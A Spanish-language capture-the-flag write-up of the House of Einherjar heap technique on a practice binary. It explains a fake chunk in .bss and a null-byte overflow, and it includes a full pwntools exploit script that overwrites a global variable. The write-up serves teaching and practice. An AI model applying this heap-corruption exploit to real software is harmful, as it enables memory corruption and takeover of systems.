# House of Einherjar
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'../.glibc/glibc_2.28_no-tcache'
    Stripped:   No
    Debuginfo:  Yes
```

Si existe la posibilidad de obtener una shell en este reto la desconozco. El objetivo de este reto fue sobreescribir la variable global `target`.

Nos dan la direccion del heap y podemos provocar un heap overflow reservando chunks no alineados a 16 bits. Por ejemplo reservar 0x88 bytes hace que `malloc` lo alinee y acabe reservando un chunk de `0x90`, `0x10` de metadatos, el resto para los datos introducidos.

Tambien cuando editamos el contenido de un chunk el programa añade '\0' al final, provocando un desbordamiento extra de un NULL BYTE.

Usando la tecnica homonima, estos son los pasos para reservar un chunk en `.bss` y sobreescribir `target`:
1. Creamos un chunk falso en la variable `user`, con `prev_size`, `size` = 0 y con `fd`, `bk` = 0x602010 (direccion de `user`).
2. Creamos dos chunks: `A`, del tamaño permitido, y `B`, de tamaño `0xf8`.
3. Editamos A y con el heap overflow sobreescribimos `B->prev_size` con la distancia entre `B` y el chunk falso de `user`. De paso el NULL BYTE sobreescribe el bit `PREV_INUSE` en `B->size`.
4. Liberamos B, provocando que se consolide con el chunk falso.
```
  /* La verificacion de integridad  chunksize (p) != prev_size (next_chunk (p))) es esquivada porque:
   chunksize(p) = 0
   next_chunk(p) = p + chunksize(p) = p
   prev_size(next_chunk(p)) = prev_size(p) = 0
 */
```
5. Reservamos un chunk `C` que acaba en la seccion `.bss`, en la direccion de `user`.
6. Sobreescribimos target con el overflow.

## Exploit

```py
from pwn import *

r = process("./house_of_einherjar")

def malloc(size):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"size:",str(size).encode())
def free(idx):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"index:",str(idx).encode())
def edit(idx,data):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"index:",str(idx).encode())
    r.sendafter(b"data:",data)

# Create fake chunk A
fake_chunk = p64(0) + p64(0) + p64(0x602010)*2
r.sendafter(b"username:",fake_chunk)

# chunksize (p) == prev_size (next_chunk (p)))

# Leak heap address
r.recvuntil(b"@ ")
heap = int(r.recv(10),16)

# Alloc B and C
# malloc alignment allocs a 0x90 chunk with 0x10 bytes for metadata
# and only 0x80 bytes for data, we can overflow C->prev_size
malloc(0x88)
malloc(0xf8)

fake_size = (heap + 0x90) - 0x602010

# Overflow C with B
# It adds a null byte to C->size and unset it's PREV_INUSE bit
edit(0,b"A"*0x80 + p64(fake_size))

# Call unlink_chunk, consolidating A and C
free(1)

# av->top = 0x602010 (user)

# Allocate a new chunk and overwrite target
malloc(0x100)
edit(2,p64(0) * 2 + b"_s1s1fo_")

r.interactive()
```

